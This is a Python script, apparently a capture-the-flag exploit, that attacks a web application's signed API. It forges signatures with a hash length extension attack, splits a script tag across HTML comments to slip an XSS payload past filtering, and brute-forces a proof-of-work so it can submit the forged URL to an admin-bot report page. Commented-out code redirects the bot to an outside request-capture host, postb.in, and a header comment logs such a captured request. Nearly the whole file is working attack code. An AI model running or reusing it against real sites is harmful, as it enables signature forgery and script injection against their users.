import sys
import hashpumpy
import requests

from urlparse import urlparse
from bs4 import BeautifulSoup

'''
    x-real-ip: 110.10.147.166
    host: postb.in
    connection: close
    upgrade-insecure-requests: 1
    user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3835.0 Safari/537.36
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    sec-fetch-site: none
    accept-encoding: gzip, deflate, br
'''

KEY_LENGTH = 12

host = sys.argv[1]

def sign(name, p1, p2):
    resp = requests.get(
        'http://%s/view.php?name=%s&p1=%s&p2=%s' %
        (host, name, p1, p2)
    )

    bs = BeautifulSoup(resp.text, 'html.parser')
    url = urlparse(bs.find_all('iframe')[0]['src'])
    query = {}
    for kv in url.query.split('&'):
        k, v = kv.split('=', 1)
        query[k] = v

    return query['q'].decode('base64'), query['sig']

def extend(q, sig, pairs, key_length=KEY_LENGTH):
    data = ''
    for (name, p1, p2) in pairs:
        data += '|%s,%s,%s' % (name.encode('base64'), p1.encode('base64'), p2.encode('base64'))
    tag, query = hashpumpy.hashpump(sig, q, data, key_length)
    return (query, tag)

def solve(c):
    import hashlib
    n = 1
    while 1:
        ans = hashlib.sha1(str(n)).hexdigest()[:5]
        if ans == c:
            break
        n += 1
    return n

def report(url):

    ses = requests.Session()
    resp = ses.get('http://%s/report.php' % host)

    _, c = resp.text.split('substr(sha1($ans). 0. 5) === ')
    c = c.split('<')[0].strip()

    print('PoW...')
    n = solve(c)

    print('Ans:', n)
    resp = ses.post('http://%s/report.php' % host, data={
        'url': url,
        'pow': str(n)
    })

    print resp.text
    print(c)

def build(q, sig):
    url = 'http://%s/api.php?sig=%s&q=%s' % (host, sig, q.encode('base64'))
    return url

def trial(q, sig):
    url = 'http://%s/api.php?sig=%s&q=%s' % (host, sig, q.encode('base64'))
    print(url)
    resp = requests.get(url)
    print resp.text

'''
q, sig = sign('header', 'Location', 'https://postb.in/1581180365766-1444342068862')

url = build(q, sig)
report(url)

exit(0)
'''

q, sig = sign('hello', '', '')
print q, sig

bodies = [
    '<scr\n',
    'ipt>',
    'alarm("lol");',
    '</script',
    '>',
]

bodies = ['\n-->%s<!--\n' % b for b in bodies]

bodies[0] = bodies[0][3:]
bodies[-1] = bodies[-1][:-4]

q, sig = extend(q, sig, [('body', b, '') for b in bodies])
print build(q, sig)

'''
q, sig = sign('hello', '', '')
q, sig = extend(q, sig, [('hello', '', '')])

trial(q, sig)
'''

print solve('b44a4')

